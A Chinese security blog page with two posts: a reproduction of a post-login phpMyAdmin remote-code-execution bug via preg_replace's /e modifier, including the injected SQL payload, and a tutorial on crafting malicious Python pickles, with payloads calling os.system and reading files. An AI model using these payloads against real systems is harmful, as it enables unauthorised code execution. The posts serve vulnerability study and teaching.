<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/4/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-phpmyadmin_登陆后_rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.676Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/">phpmyadmin_登陆后_rce</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpmyadmin登陆后rce"><a href="#phpmyadmin登陆后rce" class="headerlink" title="phpmyadmin登陆后rce"></a>phpmyadmin登陆后rce</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><blockquote>
<p>在PHP5.4.7以前，<code>preg_replace</code>的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p>
<p>以下版本受到影响：</p>
<ul>
<li>4.0.10.16之前4.0.x版本</li>
<li>4.4.15.7之前4.4.x版本</li>
<li>4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</li>
</ul>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>全局搜索preg_replace,发现以下可能有可控变量的位置:</p>
<p>容易找到</p>
<p><code>TableSearch.lib.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_getRegexReplaceRows</span>(<span class="params"><span class="variable">$columnIndex</span>, <span class="variable">$find</span>, <span class="variable">$replaceWith</span>, <span class="variable">$charSet</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$column</span> = <span class="keyword">$this</span>-&gt;_columnNames[<span class="variable">$columnIndex</span>];</span><br><span class="line">        <span class="variable">$sql_query</span> = <span class="string">&quot;SELECT &quot;</span></span><br><span class="line">            . PMA_Util::backquote(<span class="variable">$column</span>) . <span class="string">&quot;,&quot;</span></span><br><span class="line">            . <span class="string">&quot; 1,&quot;</span> <span class="comment">// to add an extra column that will have replaced value</span></span><br><span class="line">            . <span class="string">&quot; COUNT(*)&quot;</span></span><br><span class="line">            . <span class="string">&quot; FROM &quot;</span> . PMA_Util::backquote(<span class="keyword">$this</span>-&gt;_db)</span><br><span class="line">            . <span class="string">&quot;.&quot;</span> . PMA_Util::backquote(<span class="keyword">$this</span>-&gt;_table)</span><br><span class="line">            . <span class="string">&quot; WHERE &quot;</span> . PMA_Util::backquote(<span class="variable">$column</span>)</span><br><span class="line">            . <span class="string">&quot; RLIKE &#x27;&quot;</span> . PMA_Util::sqlAddSlashes(<span class="variable">$find</span>) . <span class="string">&quot;&#x27; COLLATE &quot;</span></span><br><span class="line">            . <span class="variable">$charSet</span> . <span class="string">&quot;_bin&quot;</span>; <span class="comment">// here we</span></span><br><span class="line">            <span class="comment">// change the collation of the 2nd operand to a case sensitive</span></span><br><span class="line">            <span class="comment">// binary collation to make sure that the comparison is case sensitive</span></span><br><span class="line">        <span class="variable">$sql_query</span> .= <span class="string">&quot; GROUP BY &quot;</span> . PMA_Util::backquote(<span class="variable">$column</span>)</span><br><span class="line">            . <span class="string">&quot; ORDER BY &quot;</span> . PMA_Util::backquote(<span class="variable">$column</span>) . <span class="string">&quot; ASC&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;dbi&#x27;</span>]-&gt;fetchResult(<span class="variable">$sql_query</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$result</span>)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$index</span>=&gt;<span class="variable">$row</span>) &#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="variable">$index</span>][<span class="number">1</span>] = preg_replace(</span><br><span class="line">                    <span class="string">&quot;/&quot;</span> . <span class="variable">$find</span> . <span class="string">&quot;/&quot;</span>,</span><br><span class="line">                    <span class="variable">$replaceWith</span>,</span><br><span class="line">                    <span class="variable">$row</span>[<span class="number">0</span>]</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>如果我们可以控制<code>$result和$replaceWith</code>那么我们就可以执行任意命令</p>
<p><img src="https://i.loli.net/2020/04/03/qo5ZbfuJHKA9d6m.png" alt="image1674"></p>
<p>我们先看<code>getReplacePreview</code></p>
<p><img src="https://i.loli.net/2020/04/03/vnk9IZUxJ5YoMbW.png" alt="image1764"></p>
<p>再查看调用<code>getReplacePreview</code>的函数</p>
<p><img src="https://i.loli.net/2020/04/03/JxKS1TioFz4w7ql.png" alt="image1858"></p>
<p>去看第二个和第三个明显不行,这里就不贴出来了</p>
<p>再跟进<code>tbl_find_replace.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;find&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$preview</span> = <span class="variable">$table_search</span>-&gt;getReplacePreview(</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;columnIndex&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;find&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;replaceWith&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;useRegex&#x27;</span>],</span><br><span class="line">        <span class="variable">$connectionCharSet</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$response</span>-&gt;addJSON(<span class="string">&#x27;preview&#x27;</span>, <span class="variable">$preview</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显白给</p>
<p>我们再回到<code>_getRegexReplaceRows</code>去查看它的第二个调用函数</p>
<p><img src="https://i.loli.net/2020/04/03/OhCPcviVT8tm6ZK.png" alt="image2318"></p>
<p>再查看调用replace的函数</p>
<p><img src="https://i.loli.net/2020/04/03/zT21ymqOYvUf5WE.png" alt="image2400"></p>
<p>同样后面两个还是不行</p>
<p>在跟进<code>tbl_find_replace.php</code></p>
<p><img src="https://i.loli.net/2020/04/03/j4JdNfKa8up2BCc.png" alt="image2504"></p>
<p>还是白给,两个调用链都是可以rce的,我们以前面那个为例</p>
<p>先往表中添加一条数据<code>INSERT INTO </code>flags<code> (</code>username<code>,</code>flag<code>,</code>msgid<code>) VALUES (UNHEX(&#39;302F6500&#39;),1,1);</code></p>
<p>直接抓包,修改</p>
<p><img src="https://i.loli.net/2020/04/03/FwSzMuNI4nDadBh.png" alt="image2701"></p>
<p><img src="https://i.loli.net/2020/04/03/QZE5fMTnUhPXdqV.png" alt="image2768"></p>
<p>成功</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>这个poc直接抄个别人的,懒得写了</p>
<p><code>https://www.exploit-db.com/exploits/40185</code></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" data-id="cku8j3fi2005odan75nkb53l0" data-title="phpmyadmin_登陆后_rce" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-pickle" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/pickle/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.676Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/pickle/">python  pickle 入门</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="python-pickle"><a href="#python-pickle" class="headerlink" title="python pickle"></a>python pickle</h1><h2 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h2><p> <a target="_blank" rel="noopener" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p>
<p>z牛: <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188981">https://www.anquanke.com/post/id/188981</a> </p>
<h2 id="pickle操作码大全-v0"><a href="#pickle操作码大全-v0" class="headerlink" title="pickle操作码大全(v0)"></a>pickle操作码大全(v0)</h2><p>有啥不懂的直接看源码把(z牛)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b&#x27;I&#x27;</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b&#x27;J&#x27;</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b&#x27;K&#x27;</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b&#x27;L&#x27;</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b&#x27;M&#x27;</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b&#x27;N&#x27;</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b&#x27;P&#x27;</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b&#x27;Q&#x27;</span>   <span class="comment">#  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span></span><br><span class="line">REDUCE         = <span class="string">b&#x27;R&#x27;</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b&#x27;S&#x27;</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b&#x27;T&#x27;</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b&#x27;U&#x27;</span>   <span class="comment">#  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b&#x27;V&#x27;</span>   <span class="comment"># push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b&#x27;X&#x27;</span>   <span class="comment">#   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b&#x27;a&#x27;</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b&#x27;c&#x27;</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b&#x27;d&#x27;</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b&#x27;&#125;&#x27;</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b&#x27;e&#x27;</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b&#x27;g&#x27;</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b&#x27;h&#x27;</span>   <span class="comment">#   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b&#x27;i&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b&#x27;j&#x27;</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b&#x27;l&#x27;</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b&#x27;]&#x27;</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b&#x27;o&#x27;</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b&#x27;p&#x27;</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b&#x27;q&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b&#x27;r&#x27;</span>   <span class="comment">#   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b&#x27;s&#x27;</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b&#x27;t&#x27;</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b&#x27;)&#x27;</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b&#x27;u&#x27;</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b&#x27;G&#x27;</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b&#x27;I01\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b&#x27;I00\n&#x27;</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="pickle介绍"><a href="#pickle介绍" class="headerlink" title="pickle介绍"></a>pickle介绍</h2><h3 id="pickle的大致过程"><a href="#pickle的大致过程" class="headerlink" title="pickle的大致过程"></a>pickle的大致过程</h3><p>以Foo类为例</p>
<ol>
<li>提取出Foo类中的所有attribute(从<code>__dict__</code>中获得)将其转化为键值对</li>
<li>写入对象类名</li>
<li>写入第一步生成的键值对</li>
</ol>
<h3 id="unpickle的大致过程"><a href="#unpickle的大致过程" class="headerlink" title="unpickle的大致过程"></a>unpickle的大致过程</h3><ol>
<li>获取pickle流</li>
<li>重新构建属性列表</li>
<li>根据保存的类名来创建对象</li>
<li>将属性列表恢复到对象中</li>
</ol>
<h3 id="pvm组成-解析pickle"><a href="#pvm组成-解析pickle" class="headerlink" title="pvm组成(解析pickle)"></a>pvm组成(解析pickle)</h3><ol>
<li>指令解释器<br>最后一步一定是返回栈顶元素</li>
<li>栈 </li>
<li>memo(临时保存数据)<br>用类似list的方式来读取和储存数据,以字典方式实现<br>如p100,意为把栈顶元素保存到memo中索引为100</li>
</ol>
<h3 id="pvm指令格式"><a href="#pvm指令格式" class="headerlink" title="pvm指令格式"></a>pvm指令格式</h3><ol>
<li><p>pvm的操作码只有一个字节</p>
</li>
<li><p>需要参数的操作码,要在每一个参数后面加上换行符</p>
</li>
<li><p>从pickle流中读取数据,并加载到栈上</p>
</li>
</ol>
<h2 id="如何生成pickle"><a href="#如何生成pickle" class="headerlink" title="如何生成pickle"></a>如何生成pickle</h2><h3 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h3><h4 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>加载到栈上的数据类型</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>S</td>
<td>string</td>
<td>String</td>
<td>S’foo’\n</td>
</tr>
<tr>
<td>V</td>
<td>unicode</td>
<td>unicode</td>
<td>Vfo\u006f\n</td>
</tr>
<tr>
<td>I</td>
<td>int</td>
<td>int</td>
<td>I42\n</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="修改栈-memo"><a href="#修改栈-memo" class="headerlink" title="修改栈/memo"></a>修改栈/memo</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>(</td>
<td>MARK</td>
<td>向栈中加入一个标记</td>
<td>(</td>
</tr>
<tr>
<td>0</td>
<td>POP</td>
<td>弹出栈顶元素并丢弃</td>
<td>0</td>
</tr>
<tr>
<td>p<code>&lt;memo_index&gt;</code>\n</td>
<td>PUT</td>
<td>复制栈顶元素到memo中</td>
<td>p101\n</td>
</tr>
<tr>
<td>g<code>&lt;memo_index&gt;</code>\n</td>
<td>GET</td>
<td>将memo中指定元素拷贝到栈顶</td>
<td>g101\n</td>
</tr>
</tbody></table>
<h4 id="生成-修改列表-字典-元组"><a href="#生成-修改列表-字典-元组" class="headerlink" title="生成/修改列表,字典,元组"></a>生成/修改列表,字典,元组</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>l</td>
<td>列表</td>
<td>将栈顶到遇到的第一个mask之间的元素到一个列表,并将这个列表放入栈中</td>
<td>(S’string’\nl</td>
</tr>
<tr>
<td>t</td>
<td>元组</td>
<td>将栈顶到遇到的第一个mask之间的元素放到一个元组中,并将这个元组放入栈中</td>
<td>(S’string’\nS’string2’\nt</td>
</tr>
<tr>
<td>d</td>
<td>字典</td>
<td>将栈顶到遇到的第一个mask之间的元素放到一个字典中,并将这个字典放入栈中</td>
<td>(S’key1’\nS’value1’\nS’key2’\nS’value2’\nd</td>
</tr>
<tr>
<td>s</td>
<td>SETITEM</td>
<td>从栈出弹出三个值:字典,键,值,将键值对合并到字典中</td>
<td>(S’key1’\nS’val1’\nS’key2’\nI123\ndS’key3’\nS’val 3’\ns</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="pickle-流生成元组的过程"><a href="#pickle-流生成元组的过程" class="headerlink" title="pickle 流生成元组的过程"></a>pickle 流生成元组的过程</h4><ul>
<li><p>生成元组的指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(S&#x27;str1&#x27;</span><br><span class="line">S&#x27;str2&#x27;</span><br><span class="line">I1234</span><br><span class="line">t</span><br></pre></td></tr></table></figure></li>
<li><p>生成元组的过程图</p>
</li>
</ul>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vcyoggx7j310z0fs74s.jpg" alt="image5192"></p>
<h4 id="加载对象"><a href="#加载对象" class="headerlink" title="加载对象"></a>加载对象</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>助记</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>GLOBAL</td>
<td>需要两个参数(module,class)来创建对象,并将其放到栈中</td>
<td>cos\nsystem\n</td>
</tr>
<tr>
<td>R</td>
<td>REDUCE</td>
<td>弹出一个参数元组和一个可调用对象（可能是由GLOBAL加载的），将参数应用于可调用对象并将结果压入栈中</td>
<td>cos\nsystem\n(S’sleep 10’\ntR</td>
</tr>
</tbody></table>
<h4 id="加载对象过程图"><a href="#加载对象过程图" class="headerlink" title="加载对象过程图"></a>加载对象过程图</h4><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebew5nvj312p0j8jto.jpg" alt="image5725"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebmas4ij31350k30v4.jpg" alt="image5808"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebufeq6j313g0mfq6a.jpg" alt="image5889"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec1wavgj312r0i3tb6.jpg" alt="image5970"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec9lsjpj31350iggo8.jpg" alt="image6051"></p>
<p><img src="https://ws1.sinaimg.cn/large/006pWR9aly1g9ved0gxklj31490l7q6n.jpg" alt="image6132"></p>
<h2 id="编写pickle的一些技巧"><a href="#编写pickle的一些技巧" class="headerlink" title="编写pickle的一些技巧"></a>编写pickle的一些技巧</h2><p>我们如何执行如下的代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;/path/to/massive/sikrit&#x27;</span>) </span><br><span class="line">f.read()</span><br></pre></td></tr></table></figure>

<p>思路是:首先执行open函数,将其储存在memo里面,在利用魔术方法来执行f.read()</p>
<p><code>f.read()</code>可以等价替换成<code>__builtin__.apply( __builtin__.getattr(file,&#39;read&#39;), [f])</code></p>
<p>最后合成的pickle是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#step1</span><br><span class="line">c__builtin__</span><br><span class="line">open</span><br><span class="line">(S&#x27;/path/to/massive/sikrit&#x27;</span><br><span class="line">tRp100</span><br><span class="line">#step2</span><br><span class="line">c__builtin__</span><br><span class="line">apply</span><br><span class="line">(c__builtin__</span><br><span class="line">getattr</span><br><span class="line">(c__builtin__</span><br><span class="line">file</span><br><span class="line">S&#x27;read&#x27;</span><br><span class="line">tR(g100</span><br><span class="line">ltR.</span><br></pre></td></tr></table></figure>



<h3 id="手写pickle模板"><a href="#手写pickle模板" class="headerlink" title="手写pickle模板"></a>手写pickle模板</h3><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9xumsbi3oj30qg0hoad6.jpg" alt="image6628"></p>
<h3 id="利用-reduce-来生成pickle代码"><a href="#利用-reduce-来生成pickle代码" class="headerlink" title="利用__reduce__来生成pickle代码"></a>利用<code>__reduce__</code>来生成pickle代码</h3><p><code>__reduce__</code></p>
<blockquote>
<p>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。 </p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;ls&#x27;</span>,))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Test(), protocol=<span class="number">0</span>))</span><br></pre></td></tr></table></figure>



<h3 id="利用marshal和cPickle来生成代码"><a href="#利用marshal和cPickle来生成代码" class="headerlink" title="利用marshal和cPickle来生成代码"></a>利用marshal和cPickle来生成代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;bit4&#x27;</span></span><br><span class="line">__github__ = <span 